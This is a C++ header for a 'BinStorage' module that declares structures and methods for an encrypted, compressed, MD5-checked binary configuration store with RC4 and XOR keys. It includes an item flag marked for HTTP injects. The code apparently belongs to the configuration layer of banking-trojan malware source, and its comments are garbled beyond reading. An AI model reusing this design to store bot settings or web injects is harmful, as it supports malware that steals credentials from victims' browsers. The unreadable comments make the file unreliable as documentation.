#pragma once

#include "crypt.h"

#define BINSTORAGE_MAX_SIZE (10 * 1024 * 1024) //WININET_MAXBYTES_TO_MEM

namespace BinStorage
{
    enum
    {
      ITEMF_COMPRESSED        = 0x00000001, //������ �����.

      //������ ����� ������ ��� �������� ������ ����������.
      ITEMF_COMBINE_ADD       = 0x00010000, //����� ����������, ���� ����� ���������, ������ �� ����������.
      ITEMF_COMBINE_OVERWRITE = 0x00020000, //����� ����������, ���� ����� �� ���������, ��������� ����� ������.
      ITEMF_COMBINE_REPLACE   = 0x00040000, //����� ������,���� ����� �� ���������, ������ �� ����������.
      ITEMF_COMBINE_DELETE    = 0x00080000, //����� �������� ����������� �������� � ��������.
      ITEMF_COMBINE_MASK      = ITEMF_COMBINE_ADD | ITEMF_COMBINE_OVERWRITE | ITEMF_COMBINE_REPLACE | ITEMF_COMBINE_DELETE,

      //������ ����� ������� ��� ���������� ����� ���������� dwID.
      ITEMF_IS_OPTION         = 0x10000000, //������� ������� ������.
      ITEMF_IS_SETTING        = 0x20000000, //������� �������� ����������.
      ITEMF_IS_HTTP_INJECT    = 0x40000000, //������� ������� http-��������.
      ITEMF_IS_MASK           = ITEMF_IS_OPTION | ITEMF_IS_SETTING | ITEMF_IS_HTTP_INJECT
    };

    #pragma pack(push, 1)
    typedef struct
    {
      BYTE randData[20];                //����������� ������.
      DWORD size;                       //������ ������ ���������.
      DWORD flags;                      //�����.
      DWORD count;                      //���������� �����.
      BYTE md5Hash[16/*MD5HASH_SIZE*/]; //MD5 ��� �� p + sizeof(CONFIGHEADER) �� p + dwSize.
    }STORAGE;

    typedef struct
    {
      DWORD id;       //ID �����, ������ CRC32.
      DWORD flags;    //�����.
      DWORD size;     //������ ������ ������ ���� ���������� ���� ITEMF_COMPRESSED. ����� ����� realSize.
      DWORD realSize; //�������� ������ ������.
    }ITEM;
    #pragma pack(pop)

    enum
    {
      OSF_WRITE_ACCESS = 0x1 //������� ����������� ���� ��� ������, ��� ������� ����� � ������
                             //�������� �����.
    };

    //������ � ���������.
    typedef struct
    {
      HANDLE file;     //OUT ����� �����.
      DWORD64 curItem; //OUT ������� �������� ��������.
      DWORD xorKey;    //IN XOR ����� ����������.
    }STORAGEARRAY;

    //����� ��� _Pack.
    enum
    {
      PACKF_FINAL_MODE = 0x1 //����� �����������, ������������ ��� ������ �������� ������������,
                             //��������� ����� ITEMF_COMBINE_*.
    };

    class BinStorageEx
    {
    public:
        void init(void);
        void uninit(void);
        bool _checkHash(STORAGE *binStorage);
        STORAGE *_createEmpty(void);
        bool _addItem(STORAGE **binStorage, DWORD id, DWORD flags, void *data, DWORD dataSize);
        bool _addItemAsUtf8StringW(STORAGE **binStorage, DWORD id, DWORD flags, LPWSTR string);
        bool _addItemAsUtf8StringA(STORAGE **binStorage, DWORD id, DWORD flags, LPSTR string);
        bool _modifyItem(STORAGE **binStorage, ITEM *item, DWORD flags, void *data, DWORD dataSize);
        bool _modifyItemById(STORAGE **binStorage, DWORD id, DWORD flags, void *data, DWORD dataSize);
        ITEM *_getNextItem(const STORAGE *binStorage, ITEM *curItem);
        ITEM *_getItem(const STORAGE *binStorage, DWORD id, DWORD isFlag);
        void *_getItemData(const ITEM *item);
        void *_getItemDataEx(const STORAGE *binStorage, DWORD id, DWORD isFlag, LPDWORD size);
        bool _getItemDataAsDword(const STORAGE *binStorage, DWORD id, DWORD isFlag, LPDWORD data);
        DWORD _pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key);
        DWORD _pack2(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key);
        DWORD _unpack(STORAGE **binStorage, void *data, DWORD dataSize, Crypt::RC4KEY *rc4Key);
        DWORD _unpackFromFile(STORAGE **binStorage, LPWSTR fileName, Crypt::RC4KEY *rc4Key);
        STORAGE *_combine(STORAGE *binStorage1, STORAGE *binStorage2);
        bool _openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *storageArray);
        void _closeStorageArray(STORAGEARRAY *storageArray);
        bool _addToStorageArray(STORAGEARRAY *storageArray, STORAGE *binStorage, DWORD size);
        void _resetStorageArrayPointer(STORAGEARRAY *storageArray);
        bool _getNextFromStorageArray(STORAGEARRAY *storageArray, STORAGE **binStorage, LPDWORD size, Crypt::RC4KEY *rc4Key);
        bool _removeCurrentFromStorageArray(STORAGEARRAY *storageArray);
    };

}
